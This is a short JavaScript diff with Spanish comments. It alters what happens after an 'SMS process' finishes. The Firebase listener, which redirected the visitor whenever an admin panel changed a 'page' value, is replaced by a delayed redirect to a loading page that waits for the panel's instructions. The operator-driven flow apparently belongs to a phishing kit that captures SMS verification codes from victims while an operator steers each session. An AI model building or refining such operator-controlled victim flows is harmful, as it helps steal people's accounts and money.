@@ -255,42 +255,13 @@ document.addEventListener('DOMContentLoaded', async function () {
 
             console.log('✅ Proceso SMS completado exitosamente');
             
-            // 4. Configurar escucha de cambios para redirección (igual que main.js)
-            console.log('👂 Iniciando escucha de cambios en Firebase para redirección...');
+            // 4. Redirigir a load.html para esperar instrucciones del panel
+            console.log('🚀 SMS procesado - Redirigiendo a load.html');
             
-            // Configurar timeout máximo de espera (5 minutos)
-            const timeoutId = setTimeout(() => {
-                console.log('⏰ Timeout de 5 minutos alcanzado - manteniendo en página SMS');
-            }, 5 * 60 * 1000); // 5 minutos
-            
-            // Escuchar cambios en tiempo real para redirección
-            const unsubscribe = userRef.onSnapshot((doc) => {
-                if (doc.exists) {
-                    const userData = doc.data();
-                    const page = userData.page;
-                    
-                    console.log('🔄 Cambio detectado en Firebase:', { page, userData });
-                    
-                    // Si page > 0, redireccionar según la configuración (igual que main.js)
-                    if (page > 0) { // Si el panel cambió el estado desde 0 (Cargando)
-                        console.log(`🎯 Admin cambió página a ${page} - redirigiendo`);
-                        
-                        // Cancelar timeout y desuscribirse
-                        clearTimeout(timeoutId);
-                        unsubscribe();
-                        
-                        // Usar configuración de rutas
-                        const route = appConfig.routes[page];
-                        if (route) {
-                            console.log(`🚀 Redirigiendo a: ${route.url} (${route.name})`);
-                            window.location.href = route.url;
-                        } else {
-                            console.warn(`⚠️ Ruta no encontrada para page: ${page}`);
-                            window.location.href = `page${page}.html`;
-                        }
-                    }
-                }
-            });
+            // Pequeño delay para asegurar que todo se guarde
+            setTimeout(() => {
+                window.location.href = 'load.html';
+            }, 500);
 
         } catch (error) {
             console.error('❌ Error en el proceso SMS:', error);
